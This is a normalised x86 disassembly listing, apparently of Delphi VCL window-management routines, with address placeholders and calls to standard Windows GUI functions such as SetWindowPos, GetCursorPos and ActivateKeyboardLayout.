jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_457534
test bl bl
je r-xdata
mov eax edi
call sub_45c690
mov eax edi
call sub_45c288
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_45c288
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_45a8e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_457190
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_45a934
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c690
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_458c08
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_4033e8
sub_45a97c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_455590
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_459c34
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47547c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_473964
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_45aacc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_45abab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45abb2
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_45c380
mov dl [ ebx + 0x184 ]
call sub_460fe0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4738dc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_40804c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4736dc
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4736dc
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4736dc
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_45abb8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45ac42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac49
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4738dc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_40804c
test eax eax
je r-xdata
mov eax ebx
call sub_45c380
mov dl 0x1
call sub_460fc4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_45aca4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_41775c
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_456c00
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_45acf4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_45ad28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4033e8
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_4033e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45ad68
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_456c00
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_45adc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4217f4
mov edx [ r-xdata ]
call sub_40339c
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_45adf8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_418dc4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45ae1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_45c380
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_45ae78
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_45ade4
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418dc4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_45aeb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4058b8
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4058b8
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_45af24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_45afcc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45afd3
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_4536f8
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4031ec
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4058a0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_4033e8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4058b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ edi + 0x178 ] eax
sub_45afdc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_458be0
xor edx edx
push ebp
push sub_45b09e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4033e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0a5
mov eax [ ebp - 0x4 ]
call sub_458be8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_45b0a5
mov eax [ ebp - 0x4 ]
call sub_46cc58
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_455cac
sub_45b0f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403134
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4578c0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_45b15a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_455cac
sub_45b174
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_45b19c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_46cc58
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_46cb60
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_4033e8
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_45b19c
test al al
jne r-xdata
sub_45b204
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b19c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_45d4a8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b230
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b19c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_45d4a8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b25c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_45b284
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_46cc58
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_46cb60
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_4033e8
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_45b284
test al al
jne r-xdata
sub_45b2ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b284
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b30c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b284
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b34c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_46cc58
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_4033e8
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_45b34c
test al al
jne r-xdata
sub_45b3b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b34c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b3d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45903c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_456c00
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b3d0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_45b480
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_45b3d0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_46cc58
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_456c00
test eax eax
jne r-xdata
sub_45b528
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b548
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_459fc8
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b57c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_459fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b59c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_45b5ec
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_45b610
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_454d18
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_459078
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_45903c
mov dl [ esp ]
mov si 0xffd1
call sub_4033e8
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_45b668
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4033e8
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_45b68c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4033e8
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_45b6c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4576d4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_4590d8
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4598e8
sub_45b6fc
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_4033e8
pop esi
pop ebx
retn
mov eax ebx
call sub_456090
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40443c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40443c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_45b77c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_459cc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4577a8
sub_45b7dc
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_459a3c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_458e38
pop ebx
retn
sub_45b80c
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_45b834
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_458e38
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_45b8a4
push ebx
mov ebx eax
mov eax ebx
call sub_457614
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_4590d8
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_4247bc
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_456c00
sub_45b8e0
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_4542f8
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_45c380
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_456c00
sub_45b920
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45c684
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_45c380
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45b960
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_4590d8
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_45c288
sub_45b9a0
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_45c4c0
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_45c4c0
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_45ba00
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_45665c
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_455590
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_459c34
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_45ba70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45774c
mov edx esi
mov eax ebx
call sub_459098
pop esi
pop ebx
retn
sub_45ba8c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_452934
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_46cc58
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_4033e8
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_4033e8
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_4033e8
test al al
